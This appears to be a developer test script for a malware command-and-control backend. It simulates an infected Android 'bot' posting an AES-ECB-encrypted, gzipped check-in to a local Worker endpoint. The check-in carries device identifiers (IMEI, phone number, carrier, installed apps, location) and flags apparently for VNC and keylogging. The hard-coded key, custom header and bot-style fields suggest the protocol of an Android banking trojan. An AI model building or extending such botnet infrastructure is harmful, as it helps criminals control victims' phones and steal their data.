/**
 * scripts/test-bot.js
 * Simula um bot Android enviando PING para o Worker local.
 * Uso: node scripts/test-bot.js  (a partir da raiz do monorepo)
 */
const zlib = require('zlib');
const CryptoJS = require('crypto-js');

const AES_KEY = '60170';
const WORKER_URL = 'http://localhost:8787/api/bot';

function md5(str) {
  return CryptoJS.MD5(str).toString(CryptoJS.enc.Hex);
}

function aesEncrypt(plain, key) {
  const keyHex = md5(key);
  const keyWordArray = CryptoJS.enc.Hex.parse(keyHex);
  const encrypted = CryptoJS.AES.encrypt(plain, keyWordArray, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7,
  });
  return encrypted.toString(CryptoJS.format.Base64);
}

function aesDecrypt(encryptedBase64, key) {
  const keyHex = md5(key);
  const keyWordArray = CryptoJS.enc.Hex.parse(keyHex);
  const decrypted = CryptoJS.AES.decrypt(encryptedBase64, keyWordArray, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7,
  });
  return decrypted.toString(CryptoJS.enc.Utf8);
}

async function main() {
  const payload = {
    xc: 2, // P_ACTION_PING
    bI: '492b2d09e0cdbe7956b98de33f8e0c53',
    lB: 'DONOTFILTER',
    dA: 0,
    lK: 0,
    iA: 0,
    imei: '123456789012345',
    number: '+5511999999999',
    country: 'BR',
    lang: 'pt',
    android: '11',
    model: 'SM-G950F',
    operator: 'Vivo',
    apps: 'com.whatsapp|com.android.chrome|',
    up: 12345,
    vnc: '',
    kL: 1,
    rIP: '1.2.3.4; Brazil; Sao Paulo; SP; ',
  };

  // ===== LOG PARA DEPURAÇÃO =====
  console.log(
    '📤 Payload montado (antes de criptografar):',
    JSON.stringify(payload, null, 2)
  );
  // ==============================

  const jsonStr = JSON.stringify(payload);
  const gzipped = zlib.gzipSync(Buffer.from(jsonStr, 'utf8'));
  const encrypted = aesEncrypt(gzipped.toString('base64'), AES_KEY);

  console.log('🔐 Enviando POST para', WORKER_URL);

  let res;
  try {
    res = await fetch(WORKER_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        HTTP_PACKETS_SENT: AES_KEY,
      },
      body: encrypted,
    });
  } catch (err) {
    console.error(
      '❌ Worker não respondeu. Está rodando? (npx wrangler dev na pasta api)'
    );
    console.error(err.message || err);
    process.exit(1);
  }

  const bodyText = await res.text();
  console.log('📥 Status HTTP:', res.status);

  if (!res.ok) {
    console.log('📥 Body (texto):', bodyText);
    process.exit(1);
  }

  let decrypted;
  try {
    decrypted = aesDecrypt(bodyText.trim(), AES_KEY);
  } catch (e) {
    console.error('❌ Falha ao descriptografar resposta:', e.message || e);
    console.log('Raw:', bodyText.slice(0, 200));
    process.exit(1);
  }

  try {
    const parsed = JSON.parse(decrypted);
    console.log('✅ Resposta decifrada:');
    console.log(JSON.stringify(parsed, null, 2));
  } catch {
    console.log('✅ Resposta decifrada (texto):', decrypted);
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});